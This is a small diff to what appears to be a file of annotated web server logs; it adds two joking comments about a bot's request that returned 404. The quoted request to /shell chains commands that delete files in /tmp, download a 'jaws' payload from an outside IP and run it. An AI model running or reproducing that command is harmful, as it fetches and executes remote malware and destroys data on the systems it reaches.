@@ -3,3 +3,5 @@
 210.191.89.156 - - [22/Mar/2026:06:03:05 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world" "-"
 
 # i mean, did it work at all? no! Would it ever work at all? I really don't think so, but I love it. Keep at it bro never change
+# legit this is the cutest attempt at an HTTP request I have ever seen. I don't think there is any chance, in almost any circumstance I've ever encountered that it could do anything at all.
+# it is, however, HIGHLY aspirational, and I really really respect that.
